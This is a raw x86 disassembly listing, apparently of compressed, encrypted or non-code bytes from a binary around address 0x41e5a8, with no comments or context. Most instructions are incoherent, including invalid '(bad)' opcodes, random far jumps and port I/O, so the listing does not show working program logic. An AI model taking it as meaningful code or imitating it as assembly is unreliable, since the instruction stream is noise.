  41e5a8:	push   esi
  41e5a9:	ficomp WORD PTR [eax]
  41e5ab:	push   ss
  41e5ac:	xchg   edi,eax
  41e5ad:	mov    ds:0x89afe7f2,eax
  41e5b2:	retf   0xef44
  41e5b5:	pop    edx
  41e5b6:	mov    esi,0x44075a5e
  41e5bb:	(bad)  
  41e5bc:	xchg   ebx,eax
  41e5bd:	(bad)  
  41e5be:	aaa    
  41e5bf:	push   eax
  41e5c0:	fcomp  DWORD PTR [esi]
  41e5c2:	xor    eax,0x9945c9e5
  41e5c7:	iret   
  41e5c8:	adc    eax,0xd96ddd35
  41e5cd:	mov    al,ds:0x4c1a4c32
  41e5d2:	dec    ebx
  41e5d3:	jmp    0xdaee:0x1ede6472
  41e5da:	jle    0x41e5ea
  41e5dc:	leave  
  41e5dd:	and    DWORD PTR [eax],ebx
  41e5df:	mov    ah,ah
  41e5e1:	sub    esp,DWORD PTR [ebx]
  41e5e3:	loopne 0x41e661
  41e5e5:	xor    BYTE PTR [ebp+ecx*2-0x7c],dl
  41e5e9:	(bad)  
  41e5ea:	push   0x71fa9d9a
  41e5ef:	cmp    ecx,DWORD PTR [edx-0x177bc008]
  41e5f5:	mov    bh,0xa8
  41e5f7:	add    al,0xed
  41e5f9:	xchg   ecx,eax
  41e5fa:	push   esp
  41e5fb:	inc    esp
  41e5fc:	out    0x45,al
  41e5fe:	xchg   ebx,eax
  41e5ff:	pop    esp
  41e600:	mov    eax,cs
  41e602:	lods   eax,DWORD PTR ds:[esi]
  41e603:	adc    DWORD PTR ds:0x10a453b6,edi
  41e609:	fldenv [esi+0xeffa354]
  41e60f:	lahf   
  41e610:	xchg   ah,ch
  41e612:	rcr    eax,1
  41e614:	out    0xed,al
  41e616:	add    BYTE PTR [esp+esi*8],dl
  41e619:	cmp    edi,DWORD PTR [edi]
  41e61b:	scas   al,BYTE PTR es:[edi]
  41e61c:	fimul  WORD PTR [ebx]
  41e61e:	scas   eax,DWORD PTR es:[edi]
  41e61f:	push   0x4c44883b
  41e624:	(bad)  
  41e625:	fsub   st,st(2)
  41e627:	adc    BYTE PTR [ebp-0x7d],al
  41e62a:	xor    dl,BYTE PTR [eax+ebp*1-0x50]
  41e62e:	lods   eax,DWORD PTR ds:[esi]
  41e62f:	test   BYTE PTR [edx-0x3d],dl
  41e632:	xor    esi,DWORD PTR [ecx]
  41e634:	popa   
  41e635:	dec    ebp
  41e636:	cdq    
  41e637:	arpl   WORD PTR ds:0xc74fa055,ax
  41e63d:	mov    esi,0x568fed91
  41e642:	dec    ebp
  41e643:	mov    esi,DWORD PTR [eax+eax*1-0x1c]
  41e647:	fcomi  st,st(0)
  41e649:	adc    al,0xdc
  41e64b:	dec    edi
  41e64c:	xor    esp,edi
  41e64e:	popa   
  41e64f:	xor    DWORD PTR [ecx-0x72431a83],eax
  41e655:	hlt    
  41e656:	xor    ecx,edx
  41e658:	dec    ebp
  41e659:	dec    ebp
  41e65a:	cs fwait
  41e65c:	enter  0x18b2,0xcb
  41e660:	xor    DWORD PTR [ebp-0x3d],ebx
  41e663:	pop    edx
  41e664:	(bad)  
  41e665:	push   ds
  41e666:	mov    ah,0x8c
  41e668:	or     BYTE PTR [ecx-0x603a86bb],al
  41e66e:	jmp    0x436d:0x852b3651
  41e675:	hlt    
  41e676:	pop    ds
  41e677:	and    al,0xa9
  41e679:	fsub   QWORD PTR [esi+esi*2]
  41e67c:	mov    eax,ds:0xf1a8052c
  41e681:	push   0xaabd8192
  41e686:	add    al,0xc4
  41e688:	das    
  41e689:	and    bh,BYTE PTR [ebx]
  41e68b:	in     eax,0x91
  41e68d:	clc    
  41e68e:	int3   
  41e68f:	jmp    0x41e694
	...
  41e6f4:	lds    ebx,FWORD PTR [eax+0x7dfd55e1]
  41e6fa:	cmc    
  41e6fb:	cwde   
  41e6fc:	xchg   esp,eax
  41e6fd:	push   0x37
  41e6ff:	sub    ebp,DWORD PTR [eax]
  41e701:	pop    edx
  41e702:	jp     0x41e77e
  41e704:	pushf  
  41e705:	inc    ebx
  41e706:	add    DWORD PTR [eax],eax
  41e708:	add    al,0x1
  41e70a:	add    BYTE PTR [eax],al
  41e70c:	sub    DWORD PTR [esi-0xfbead50],ebx
  41e712:	ins    BYTE PTR es:[edi],dx
  41e713:	adc    edx,DWORD PTR [edx]
  41e715:	or     ch,BYTE PTR [ecx+eax*8-0x51]
  41e719:	mov    gs,WORD PTR [ebx-0x1f]
  41e71c:	adc    eax,0xe4300b37
  41e721:	idiv   DWORD PTR [edi]
  41e723:	and    DWORD PTR fs:[esi],ebp
  41e726:	pop    ds
  41e727:	out    0x13,eax
  41e729:	push   esi
  41e72a:	jo     0x41e7aa
  41e72c:	leave  
  41e72d:	scas   al,BYTE PTR es:[edi]
  41e72e:	cdq    
  41e72f:	pop    ds
  41e730:	sbb    BYTE PTR [edx],ch
  41e732:	or     BYTE PTR [eax-0x5db3b617],al
  41e738:	cmc    
  41e739:	fs xchg esi,eax
  41e73b:	mov    dl,0xcf
  41e73d:	(bad)  
  41e73e:	fisub  WORD PTR [ebx+0x7a]
  41e741:	or     ax,0x4391
  41e745:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41e746:	cmp    cl,ch
  41e748:	(bad)  
  41e749:	pushf  
  41e74a:	gs or  al,0xfe
  41e74d:	inc    eax
  41e74e:	imul   edx,DWORD PTR [edi],0xffffff96
  41e751:	mov    ecx,0x6d522569
  41e756:	test   al,0x6a
  41e758:	push   esi
  41e759:	std    
  41e75a:	pop    ebx
  41e75b:	fwait
  41e75c:	sub    al,BYTE PTR [eax-0x5b]
  41e75f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e760:	test   DWORD PTR [ecx-0x39],ebx
  41e763:	dec    eax
  41e764:	xchg   ebp,eax
  41e765:	out    dx,al
  41e766:	add    dh,al
  41e768:	sbb    eax,0xd08f1f17
  41e76d:	pop    ds
  41e76e:	ss mov ch,0x48
  41e771:	nop
  41e772:	int3   
  41e773:	(bad)  
  41e774:	lock or BYTE PTR [edx-0x65ce95c1],0xd6
  41e77c:	xchg   DWORD PTR [edi],edi
  41e77e:	mov    BYTE PTR [edi+0x17],bl
  41e781:	lods   al,BYTE PTR ds:[esi]
  41e782:	add    ch,BYTE PTR [edx+0x6b97f06]
  41e788:	mov    bl,0x80
  41e78a:	mov    edi,0xbc890da5
  41e78f:	loop   0x41e71d
  41e791:	mov    ah,0x8c
  41e793:	dec    esp
  41e794:	int3   
  41e795:	rcl    BYTE PTR [ecx+0x2f],0x4c
  41e799:	mov    esp,0xd7e2ac20
  41e79e:	jmp    0x9e98:0x7d3c887e
  41e7a5:	(bad)  
  41e7a6:	and    bh,BYTE PTR [esi]
  41e7a8:	sub    ecx,DWORD PTR [edi-0x50]
  41e7ab:	stc    
  41e7ac:	(bad)  
  41e7ad:	imul   BYTE PTR [eax+eiz*2]
  41e7b0:	(bad)  
  41e7b1:	jge    0x41e802
  41e7b3:	xchg   esi,eax
  41e7b4:	jae    0x41e7a7
  41e7b6:	dec    eax
  41e7b7:	add    bl,BYTE PTR [ebx+0x74858a30]
  41e7bd:	cmp    DWORD PTR [ebx+0x3adc6a65],ecx
  41e7c3:	out    0xd6,eax
  41e7c5:	(bad)  
  41e7c6:	xlat   BYTE PTR ds:[ebx]
  41e7c7:	sar    DWORD PTR [ebx+ecx*2+0x544284b0],1
  41e7ce:	cmc    
  41e7cf:	icebp  
  41e7d0:	xchg   ebp,eax
  41e7d1:	mov    al,ds:0xab129238
  41e7d6:	mov    cl,0xa9
  41e7d8:	sub    DWORD PTR ds:0x8c655c1a,0xffffff9d
  41e7df:	push   0xf
  41e7e1:	cli    
  41e7e2:	sub    bl,BYTE PTR [ecx-0x535408c5]
  41e7e8:	xor    bh,dh
  41e7ea:	xor    bh,BYTE PTR [ebx]
  41e7ec:	out    0x31,al
  41e7ee:	jmp    0xc5db:0x14d1bab3
  41e7f5:	outs   dx,DWORD PTR ds:[esi]
  41e7f6:	xchg   BYTE PTR [edi],bh
  41e7f8:	(bad)  
  41e7f9:	xor    ecx,DWORD PTR [edx]
  41e7fb:	and    bh,BYTE PTR [esi]
  41e7fd:	cdq    
  41e7fe:	add    bl,cl
  41e800:	out    0xb6,al
  41e802:	in     eax,dx
  41e803:	popf   
  41e804:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41e805:	xchg   edi,eax
  41e806:	call   0x8844cb24
  41e80b:	call   0x91bd0ed1
	...
  41e874:	sub    eax,0x9e5c8a39
  41e879:	(bad)  
  41e87a:	(bad)  
  41e87b:	jns    0x41e8ec
  41e87d:	xor    al,0xcc
  41e87f:	jg     0x41e876
  41e881:	sub    esi,esp
  41e883:	inc    ecx
  41e884:	mov    al,ds:0x4000144
  41e889:	add    DWORD PTR [eax],eax
  41e88b:	add    BYTE PTR [esi+esi*4],ah
  41e88e:	(bad)
  41e892:	enter  0xdbf2,0xfc
  41e896:	jp     0x41e895
  41e898:	icebp  
  41e899:	jg     0x41e865
  41e89b:	mov    bh,0x25
  41e89d:	pop    es
  41e89e:	jno    0x41e89c
  41e8a0:	pop    esi
  41e8a1:	mov    ds:0xcd0f56df,al
  41e8a6:	loope  0x41e904
  41e8a8:	mov    cl,BYTE PTR [ecx+0x52]
  41e8ab:	call   FWORD PTR [ecx+ebp*4+0x3dfc95b1]
  41e8b2:	dec    ecx
  41e8b3:	mov    dl,0xee
  41e8b5:	out    0xac,al
  41e8b7:	outs   dx,DWORD PTR ds:[esi]
  41e8b8:	sub    DWORD PTR [ebx-0x78aac7e1],ebx
  41e8be:	cdq    
  41e8bf:	or     DWORD PTR [eax],ebp
  41e8c1:	stos   DWORD PTR es:[edi],eax
  41e8c2:	retf   
  41e8c3:	popa   
  41e8c4:	sub    ebx,DWORD PTR [edx-0x26c1a873]
  41e8ca:	scas   eax,DWORD PTR es:[edi]
  41e8cb:	or     eax,ebp
  41e8cd:	push   ecx
  41e8ce:	mov    bl,0x6f
  41e8d0:	push   esi
  41e8d1:	mov    edi,0x6577eddd
  41e8d6:	push   eax
  41e8d7:	pop    eax
  41e8d8:	out    dx,al
  41e8d9:	dec    ebx
  41e8da:	ret    
  41e8db:	cmp    eax,0x324810ef
  41e8e0:	jno    0x41e86c
  41e8e2:	mov    edi,0x79c37860
  41e8e7:	ins    BYTE PTR es:[edi],dx
  41e8e8:	pop    es
  41e8e9:	pop    ss
  41e8ea:	xchg   esp,eax
  41e8eb:	xor    bh,bl
  41e8ed:	icebp  
  41e8ee:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e8ef:	stc    
  41e8f0:	jmp    0x2cc7:0xda8958e2
  41e8f7:	lds    edi,FWORD PTR [esi+0x47753533]
  41e8fd:	outs   dx,BYTE PTR ds:[esi]
  41e8fe:	add    BYTE PTR [edx],dl
  41e900:	and    ecx,DWORD PTR [ecx-0x3530c1a1]
  41e906:	into   
  41e907:	outs   dx,BYTE PTR ds:[esi]
  41e908:	xchg   edi,eax
  41e909:	jp     0x41e8f7
  41e90b:	fdivr  DWORD PTR [eax+0x2d35dd0c]
  41e911:	xchg   edi,eax
  41e912:	test   ch,dl
  41e914:	data16 sub al,0x9d
  41e917:	hlt    
  41e918:	dec    edi
  41e919:	cs ins BYTE PTR es:[edi],dx
  41e91b:	push   edx
  41e91c:	(bad)  
  41e91d:	lock jp 0x41e928
  41e920:	add    BYTE PTR [edi-0x6a],bh
  41e923:	mov    eax,0xa0cce4dd
  41e928:	mov    ecx,0x683ee8f9
  41e92d:	(bad)  
  41e92e:	pop    edx
  41e92f:	xor    edi,DWORD PTR [eax+0x7b52d70b]
  41e935:	push   esi
  41e936:	adc    dl,BYTE PTR [ecx-0x14de302d]
  41e93c:	xchg   ebx,eax
  41e93d:	sbb    al,0x2
  41e93f:	stos   BYTE PTR es:[edi],al
  41e940:	out    0x37,eax
  41e942:	add    ah,BYTE PTR [ebx+0x24]
  41e945:	js     0x41e9c4
  41e947:	cli    
  41e948:	xchg   edi,eax
  41e949:	fisubr WORD PTR [ebp-0x4afa5175]
  41e94f:	stc    
  41e950:	push   es
  41e951:	ret    
  41e952:	out    dx,eax
  41e953:	ss gs das 
  41e956:	and    ah,BYTE PTR [ecx+0x485681e6]
  41e95c:	mov    WORD PTR [edi],cs
  41e95e:	cdq    
  41e95f:	dec    edi
  41e960:	inc    ecx
  41e961:	xor    al,BYTE PTR [eax-0x5e49f9b9]
  41e967:	xor    cl,BYTE PTR [esi+0x1d]
  41e96a:	add    al,0x5e
  41e96c:	dec    eax
  41e96d:	xor    BYTE PTR [esi-0x4d],0x3a
  41e971:	pop    ds
  41e972:	xor    BYTE PTR [eax],al
  41e974:	mov    ebp,0x950a0218
  41e979:	enter  0xb667,0x43
  41e97d:	mov    dl,0xde
  41e97f:	xlat   BYTE PTR ds:[ebx]
  41e980:	stc    
  41e981:	outs   dx,BYTE PTR ds:[esi]
  41e982:	xor    BYTE PTR ds:0x5ec40248,ch
  41e988:	lds    edi,FWORD PTR [ecx+edi*2]
  41e98b:	mov    cl,0x86
  41e98d:	push   edx
  41e98e:	and    bl,dl
	...
  41e9f4:	js     0x41e9f3
  41e9f6:	ret    0xc766
  41e9f9:	jg     0x41e9f7
  41e9fb:	dec    DWORD PTR [edi+0x67]
  41e9fe:	rol    dl,1
  41ea00:	aam    0x88
  41ea02:	mov    ds:0x145a470,eax
  41ea07:	add    BYTE PTR [ecx+eax*1],al
  41ea0a:	add    BYTE PTR [eax],al
  41ea0c:	push   ecx
  41ea0d:	sub    ah,ch
  41ea0f:	push   ss
  41ea10:	mov    eax,0xfb6b8a52
  41ea15:	sbb    ebx,DWORD PTR [ebp-0x526b232]
  41ea1b:	ss js  0x41e9b6
  41ea1e:	cwde   
  41ea1f:	dec    esp
  41ea20:	mov    eax,0xebad6bfb
  41ea25:	ficom  WORD PTR [edi]
  41ea27:	jp     0x41eaa0
  41ea29:	mov    cl,BYTE PTR [ebx+edx*1]
  41ea2c:	or     eax,0xb83e65e4
  41ea31:	sub    bl,ah
  41ea33:	or     ebp,DWORD PTR [edi]
  41ea35:	and    eax,0x20744fab
  41ea3a:	mov    ch,0x5f
  41ea3c:	nop
  41ea3d:	lea    edx,[esp+ecx*2+0xa]
  41ea41:	add    DWORD PTR [edi-0x4f],esp
  41ea44:	mov    al,ds:0x6709ce7e
  41ea49:	jne    0x41e9ec
  41ea4b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ea4c:	push   edi
  41ea4d:	mov    ?,WORD PTR [edx-0x325c0b1c]
  41ea53:	mov    ds:0x4410922f,al
  41ea58:	(bad)  
  41ea59:	push   esp
  41ea5a:	div    BYTE PTR [esi-0x45]
  41ea5d:	icebp  
  41ea5e:	jp     0x41ea81
  41ea60:	mov    dl,0x0
  41ea62:	pop    esp
  41ea63:	adc    DWORD PTR ds:0x3ea79560,esp
  41ea69:	inc    ebx
  41ea6a:	fstp   DWORD PTR [ecx+0x242cec03]
  41ea70:	push   esi
  41ea71:	test   eax,0x85289c73
  41ea76:	push   esp
  41ea77:	fcom   DWORD PTR [ebx+0x7fd072ad]
  41ea7d:	adc    dh,BYTE PTR [eax+0x7301526f]
  41ea83:	ja     0x41eaed
  41ea85:	or     BYTE PTR [ebp-0x70],bh
  41ea88:	iret   
  41ea89:	(bad)  
  41ea8a:	(bad)  
  41ea8b:	mov    ecx,0xf5faf959
  41ea90:	fsub   st,st(3)
  41ea92:	xchg   edx,eax
  41ea93:	ja     0x41eac6
  41ea95:	mov    ds:0x5c7d5b06,al
  41ea9a:	(bad)  
  41ea9b:	ja     0x41ea28
  41ea9d:	bswap  edx
  41ea9f:	or     DWORD PTR [esi+0x69],esi
  41eaa2:	js     0x41ea83
  41eaa4:	cmp    eax,edi
  41eaa6:	pop    es
  41eaa7:	popa   
  41eaa8:	pop    esp
  41eaa9:	sub    al,0xae
  41eaab:	push   eax
  41eaad:	pusha  
  41eaae:	shl    BYTE PTR [ecx],1
  41eab0:	adc    dh,dl
  41eab2:	push   eax
  41eab3:	cdq    
  41eab4:	in     eax,dx
  41eab5:	xchg   BYTE PTR [ebx-0x53f237a3],dh
  41eabb:	out    0xc6,eax
  41eabd:	adc    al,0xe0
  41eabf:	shl    DWORD PTR [eax+0x5c02e037],0x50
  41eac6:	std    
  41eac7:	and    al,0xae
  41eac9:	ds add eax,0x4331d85e
  41eacf:	popa   
  41ead0:	or     eax,0x23c62966
  41ead5:	fstp   TBYTE PTR [edx]
  41ead7:	inc    esi
  41ead8:	cmp    dh,bl
  41eada:	add    dl,BYTE PTR [esi]
  41eadc:	(bad)  
  41eadd:	mov    ds:0xa7cbcc89,eax
  41eae2:	sar    BYTE PTR [esi],0x52
  41eae5:	fnsave [ebx-0x77]
  41eae8:	and    DWORD PTR ds:0x86718689,edi
  41eaee:	fs jns 0x41eaf0
  41eaf1:	arpl   WORD PTR [ecx],bx
  41eaf3:	addr16 test al,0x42
  41eaf6:	loopne 0x41eaae
  41eaf8:	lods   eax,DWORD PTR ds:[esi]
  41eaf9:	or     eax,0xf14ae884
  41eafe:	and    eax,0x63135c04
  41eb03:	daa    
  41eb04:	jg     0x41eaeb
  41eb06:	(bad)  
  41eb07:	scas   eax,DWORD PTR es:[edi]
  41eb08:	jne    0x41eb06
  41eb0a:	dec    eax
  41eb0b:	adc    al,0xf
  41eb0d:	sub    DWORD PTR [edx],edx
  41eb0f:	out    0x0,al
	...
  41eb71:	add    BYTE PTR [eax],al
  41eb73:	add    BYTE PTR [edx],dl
  41eb75:	das    
  41eb76:	mov    esi,DWORD PTR [edi+edi*4+0xaaf3fb4]
  41eb7d:	out    0x9b,al
  41eb7f:	aad    0x2e
  41eb81:	popf   
  41eb82:	xor    bl,bh
  41eb84:	test   al,0x46
  41eb86:	add    DWORD PTR [eax],eax
  41eb88:	add    al,0x1
  41eb8a:	add    BYTE PTR [eax],al
  41eb8c:	jecxz  0x41ebb9
  41eb8e:	ins    BYTE PTR es:[edi],dx
  41eb8f:	jecxz  0x41eb6d
  41eb91:	adc    BYTE PTR [edx-0x36],al
  41eb94:	mov    al,0x53
  41eb96:	fcom   DWORD PTR [eax+eiz*8-0x366725b0]
  41eb9d:	jae    0x41eb5b
  41eb9f:	ror    ecx,1
  41eba1:	(bad)  
  41eba2:	jmp    0x28da:0xeeef71fd
  41eba9:	push   esp
  41ebaa:	jbe    0x41ebf8
  41ebac:	pop    eax
  41ebad:	cmp    eax,0x5d84cd9a
  41ebb2:	aaa    
  41ebb3:	lahf   
  41ebb4:	push   edx
  41ebb5:	push   es
  41ebb6:	enter  0x86b1,0x3d
  41ebba:	push   ebp
  41ebbb:	daa    
  41ebbc:	daa    
  41ebbd:	adc    BYTE PTR [ebp-0x5f38a52b],dh
  41ebc3:	cmp    BYTE PTR [ebx],0xd6
  41ebc6:	sbb    edi,DWORD PTR [ebx]
  41ebc8:	push   ss
  41ebc9:	(bad)  
  41ebcb:	(bad)  
  41ebcc:	dec    ebp
  41ebcd:	shr    BYTE PTR [eax-0x23],cl
  41ebd0:	popa   
  41ebd1:	inc    esi
  41ebd2:	in     eax,0x0
  41ebd4:	mov    edi,0x55c224e1
  41ebd9:	inc    esi
  41ebda:	jne    0x41ec08
  41ebdc:	adc    DWORD PTR [ebx-0x42d560bb],0x2eca7b9e
  41ebe6:	push   esp
  41ebe7:	pop    ebx
  41ebe8:	xchg   esi,eax
  41ebe9:	and    esi,esi
  41ebeb:	pop    edi
  41ebec:	jns    0x41ec42
  41ebee:	and    al,0x47
  41ebf0:	iret   
  41ebf1:	push   ss
  41ebf2:	jbe    0x41ebbc
  41ebf4:	or     al,0x5
  41ebf6:	test   eax,0xc1b66866
  41ebfb:	pop    eax
  41ebfc:	call   0x710:0x4a54e3d4
  41ec03:	pop    ebp
  41ec04:	lahf   
  41ec05:	mov    dl,0xd7
  41ec07:	ins    DWORD PTR es:[edi],dx
  41ec08:	pushf  
  41ec09:	ins    BYTE PTR es:[edi],dx
  41ec0a:	and    dh,BYTE PTR [eax]
  41ec0c:	fdivr  QWORD PTR [esi-0x68]
  41ec0f:	or     DWORD PTR [ecx],ecx
  41ec11:	into   
  41ec12:	dec    eax
  41ec13:	stos   DWORD PTR es:[edi],eax
  41ec14:	sbb    DWORD PTR [edx+0x62],ebx
  41ec17:	repz push esi
  41ec19:	out    0x71,eax
  41ec1b:	into   
  41ec1c:	call   0x8fef5320
  41ec21:	cmc    
  41ec22:	mov    BYTE PTR [edx-0x4cf39c53],dl
  41ec28:	fsubr  QWORD PTR [esi-0x7a7c1d65]
  41ec2e:	leave  
  41ec2f:	(bad)  
  41ec30:	rcr    ecx,1
  41ec32:	pop    ebp
  41ec33:	jge    0x41ec6f
  41ec35:	hlt    
  41ec36:	mov    edx,0x1369534f
  41ec3b:	adc    ch,BYTE PTR [ecx+0x3d]
  41ec3e:	and    al,0x73
  41ec40:	stos   BYTE PTR es:[edi],al
  41ec41:	sbb    edx,ebx
  41ec43:	fwait
  41ec44:	pop    esi
  41ec45:	mov    ch,0x8f
  41ec47:	xchg   edx,eax
  41ec48:	mul    BYTE PTR [eax+0x28]
  41ec4b:	mov    dl,0x31
  41ec4d:	and    DWORD PTR [esi-0x65],ebx
  41ec50:	mov    eax,0xcb270c86
  41ec55:	stos   BYTE PTR es:[edi],al
  41ec56:	mov    ebx,0x83a5f4f3
  41ec5b:	rcl    BYTE PTR [ecx*2+0x7cd2808d],0x15
  41ec63:	cmp    dl,BYTE PTR [ebp+esi*2-0x48]
  41ec67:	cmp    eax,0xc1dc3c8a
  41ec6c:	(bad)  
  41ec6d:	mov    al,ds:0x97c3944e
  41ec72:	test   BYTE PTR [edi],0x25
  41ec75:	scas   eax,DWORD PTR es:[edi]
  41ec76:	iret   
  41ec77:	jp     0x41ecce
  41ec79:	and    ecx,DWORD PTR [ecx-0x57]
  41ec7c:	call   0xe60b:0xf7d42498
  41ec83:	mov    ebp,0xa8d8c28e
  41ec88:	in     eax,0xd8
  41ec8a:	cdq    
  41ec8b:	cmp    DWORD PTR [ecx-0xc],0xffffff91
  41ec8f:	jno    0x41ec91
	...
  41ecf1:	add    BYTE PTR [eax],al
  41ecf3:	add    BYTE PTR [ecx-0xf],al
  41ecf6:	(bad)
  41ecf9:	hlt    
  41ecfa:	gs icebp 
  41ecfc:	dec    edi
  41ecfd:	adc    eax,0xb2d65fd0
  41ed02:	jae    0x41ecad
  41ed04:	lods   al,BYTE PTR ds:[esi]
  41ed05:	inc    edi
  41ed06:	add    DWORD PTR [eax],eax
  41ed08:	add    al,0x1
  41ed0a:	add    BYTE PTR [eax],al
  41ed0c:	test   BYTE PTR [eax-0x7f],0xad
  41ed10:	xor    BYTE PTR [ebx-0x5189926],cl
  41ed16:	and    al,0x6d
  41ed18:	jge    0x41ed67
  41ed1a:	dec    ecx
  41ed1b:	imul   eax,DWORD PTR [eax-0x50],0xa016916f
  41ed22:	xor    DWORD PTR [ebp+0x26],0x33
  41ed26:	inc    ebp
  41ed27:	jno    0x41ed4c
  41ed29:	inc    ebp
  41ed2a:	and    BYTE PTR [ebp+eax*2+0x4dc8c481],al
  41ed31:	mov    al,0x45
  41ed33:	jmp    0xa303:0xad5d2150
  41ed3a:	hlt    
  41ed3b:	xchg   ecx,eax
  41ed3c:	je     0x41ecc2
  41ed3e:	push   edx
  41ed3f:	push   eax
  41ed40:	sub    eax,0x8f33c604
  41ed45:	sub    al,0x6b
  41ed47:	clc    
  41ed48:	ret    0x402b
  41ed4b:	jge    0x41ecfc
  41ed4d:	cwde   
  41ed4e:	inc    edi
  41ed4f:	jb     0x41ed88
  41ed51:	stc    
  41ed52:	and    dl,0xcd
  41ed55:	loope  0x41ed86
  41ed57:	sbb    BYTE PTR [ebx+eiz*1-0x26],al
  41ed5b:	cmp    esp,edi
  41ed5d:	pop    ebx
  41ed5e:	or     BYTE PTR [ebx+eax*4],ah
  41ed61:	into   
  41ed62:	aad    0xf3
  41ed64:	push   cs
  41ed65:	mov    ebx,0x12781a8c
  41ed6a:	adc    BYTE PTR [edi],0xaf
  41ed6d:	pop    ss
  41ed6e:	cmp    edx,0x85023048
  41ed74:	mov    al,0xbf
  41ed76:	xor    al,dh
  41ed78:	popa   
  41ed79:	and    BYTE PTR [edi-0x36],dl
  41ed7c:	inc    esp
  41ed7d:	sub    BYTE PTR [eax-0x7b2bba97],dl
  41ed83:	or     al,0xc2
  41ed85:	adc    eax,0xdeeba2d1
  41ed8a:	stos   DWORD PTR es:[edi],eax
  41ed8b:	arpl   dx,bx
  41ed8d:	sbb    eax,0xafeae8b5
  41ed92:	(bad)  
  41ed93:	sbb    edx,DWORD PTR [ecx]
  41ed95:	int3   
  41ed96:	pop    ecx
  41ed97:	add    ebx,DWORD PTR [eax+0x2e95d969]
  41ed9d:	ficom  DWORD PTR [ebx+0x410e5a7c]
  41eda3:	xchg   ah,cl
  41eda5:	xlat   BYTE PTR ds:[ebx]
  41eda6:	clc    
  41eda7:	and    eax,0x223bd7e9
  41edac:	loope  0x41ed84
  41edae:	fwait
  41edaf:	push   0xf66f1650
  41edb4:	int3   
  41edb5:	jb     0x41ee24
  41edb7:	push   eax
  41edb8:	adc    esi,DWORD PTR [eax+0x6c2129e0]
  41edbe:	adc    BYTE PTR [ecx-0x56],dl
  41edc1:	xor    al,0xdb
  41edc3:	loop   0x41ee3c
  41edc5:	mov    bh,0x84
  41edc7:	in     al,0x25
  41edc9:	sub    BYTE PTR [ebp-0x7fb5b044],0x20
  41edd0:	xchg   edx,eax
  41edd1:	mov    edi,0xcdfe8f5d
  41edd6:	push   ss
  41edd7:	mov    ah,dl
  41edd9:	inc    edi
  41edda:	mov    WORD PTR [edx],ds
  41eddc:	outs   dx,DWORD PTR ds:[esi]
  41eddd:	repz mov esp,0x93d505b
  41ede3:	test   esp,eax
  41ede5:	jge    0x41ee4d
  41ede7:	or     cl,BYTE PTR [ecx+ecx*8+0x5e2dc609]
  41edee:	sub    edi,DWORD PTR [esi-0x62]
  41edf1:	mov    DWORD PTR [edi-0x69f6691d],edx
  41edf7:	sbb    BYTE PTR [edi+0x13],0x39
  41edfb:	into   
  41edfc:	jecxz  0x41edb4
  41edfe:	ffreep st(3)
  41ee00:	mov    ebp,0x1ea92b93
  41ee05:	adc    DWORD PTR [eax+0x7d],0x2a
  41ee09:	jmp    0x41ee65
  41ee0b:	iret   
  41ee0c:	sbb    BYTE PTR [esi+edx*1+0x56],0x0
	...
  41ee71:	add    BYTE PTR [eax],al
  41ee73:	add    BYTE PTR ds:0x7b197956,al
  41ee79:	aas    
  41ee7a:	gs pop esi
  41ee7c:	pop    edx
  41ee7d:	repnz call 0xb0c2:0x545071e7
  41ee85:	dec    eax
  41ee86:	add    DWORD PTR [eax],eax
  41ee88:	add    al,0x1
  41ee8a:	add    BYTE PTR [eax],al
  41ee8c:	and    dh,bl
  41ee8e:	repnz pop ss
  41ee90:	jmp    0x41eeb2
  41ee92:	pop    ds
  41ee93:	cmp    al,0xb5
  41ee95:	adc    DWORD PTR [edx+0x7fcf9b4f],ebp
  41ee9b:	jg     0x41ee3d
  41ee9d:	dec    ebp
  41ee9e:	or     BYTE PTR [edi],ah
  41eea0:	ror    DWORD PTR [ebp+esi*8+0x327a4ada],0xab
  41eea8:	(bad)  
  41eea9:	scas   eax,DWORD PTR es:[edi]
  41eeaa:	jle    0x41ee3a
  41eeac:	dec    esp
  41eead:	xchg   ebp,eax
  41eeae:	add    eax,0x9e528a6b
  41eeb3:	cmp    ah,0xcb
  41eeb6:	mov    al,0x17
  41eeb8:	xlat   BYTE PTR ds:[ebx]
  41eeb9:	out    dx,eax
  41eeba:	jb     0x41eea3
  41eebc:	jne    0x41eea2
  41eebe:	and    edx,esi
  41eec0:	test   eax,0xd34726d2
  41eec5:	iret   
  41eec6:	mov    al,0x52
  41eec8:	dec    edi
  41eec9:	dec    edx
  41eeca:	loopne 0x41eed7
  41eecc:	loopne 0x41ef49
  41eece:	retf   
  41eecf:	sbb    DWORD PTR [esp+ebx*1+0x646fe3f3],edi
  41eed6:	adc    esp,ecx
  41eed8:	mov    ebp,0x928ad1ce
  41eedd:	ret    0x84ab
  41eee0:	repnz or al,0xbb
  41eee3:	cmp    eax,0xb321e941
  41eee8:	stos   DWORD PTR es:[edi],eax
  41eee9:	jnp    0x41ef41
  41eeeb:	mov    ebp,0x33bef408
  41eef0:	adc    DWORD PTR [ebx+0x3b],eax
  41eef3:	xor    eax,0x439405ed
  41eef8:	in     al,dx
  41eef9:	add    esi,eax
  41eefb:	cld    
  41eefc:	push   ds
  41eefd:	inc    ebx
  41eefe:	js     0x41ee99
  41ef00:	pusha  
  41ef01:	mov    al,0x7
  41ef03:	mov    ch,0x7a
  41ef05:	jnp    0x41ef7f
  41ef07:	dec    ecx
  41ef08:	rcl    DWORD PTR [ebx],cl
  41ef0a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ef0b:	pop    eax
  41ef0c:	mov    ebp,0xffe1db4c
  41ef11:	mov    eax,ds:0xf9be2c1c
  41ef16:	lods   eax,DWORD PTR ds:[esi]
  41ef17:	push   es
  41ef18:	sub    BYTE PTR [edi],cl
  41ef1a:	(bad)  
  41ef1b:	pop    ebx
  41ef1c:	cmp    DWORD PTR [ebp+eax*8-0x58],0x38
  41ef21:	cld    
  41ef22:	mov    bl,BYTE PTR [esi+ebx*1-0xbc7f974]
  41ef29:	jae    0x41eed9
  41ef2b:	mov    bh,0x9e
  41ef2d:	stos   BYTE PTR es:[edi],al
  41ef2e:	stc    
  41ef2f:	xor    al,0xc4
  41ef31:	retf   
  41ef32:	lock jae 0x41eec9
  41ef35:	popf   
  41ef36:	add    eax,0xac00450c
  41ef3b:	jb     0x41ef81
